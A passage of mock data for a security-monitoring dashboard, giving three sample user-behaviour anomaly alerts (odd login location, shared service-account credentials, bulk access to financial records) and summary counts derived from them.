  { id: "uba-006", timestamp: subHours(now, 4), userId: "USR-0055", username: "dchen", department: "Development", anomalyType: "unusual_login_time", severity: "low", riskScore: 52, description: "Login at 02:17 AM from unusual geolocation — Singapore", details: "Developer dchen authenticated at 02:17 AM EST from Singapore (normally US East Coast). VPN session established. May be legitimate travel but no OOO notice filed.", sourceIp: "103.6.84.22", location: "Singapore", status: "resolved" },
  { id: "uba-007", timestamp: subHours(now, 5), userId: "USR-0011", username: "svc_deploy", department: "DevOps", anomalyType: "credential_sharing", severity: "medium", riskScore: 67, description: "Service account credentials used from 3 different source IPs simultaneously", details: "svc_deploy account authenticated concurrently from 10.0.2.33 (workstation-08), 10.0.4.88 (dev-laptop-03), and 185.192.72.11 (external IP). Credentials likely compromised or being shared.", sourceIp: "185.192.72.11", status: "open" },
  { id: "uba-008", timestamp: subHours(now, 6), userId: "USR-0099", username: "lnguyen", department: "Accounting", anomalyType: "excessive_data_access", severity: "high", riskScore: 79, description: "User accessed 340% more records than daily baseline", details: "lnguyen accessed 2,847 financial records today vs. 30-day baseline of 847/day. Bulk export of accounts payable, vendor PII, and banking records to local drive. No business justification on record.", sourceIp: "10.0.3.45", status: "investigating" },
];

// ─── SUMMARY STATS ─────────────────────────────────────────────────────────────
export const dashboardStats = {
  totalEvents: 4821,
  activeAlerts: alerts.filter(a => ["open", "investigating", "acknowledged"].includes(a.status)).length,
  onlineAssets: assets.filter(a => a.status === "online").length,
  threatIntelCount: threatIntel.length,
  criticalEvents: securityEvents.filter(e => e.severity === "critical").length,
  highEvents: securityEvents.filter(e => e.severity === "high").length,
  mediumEvents: securityEvents.filter(e => e.severity === "medium").length,
  lowEvents: securityEvents.filter(e => e.severity === "low" || e.severity === "info").length,
};
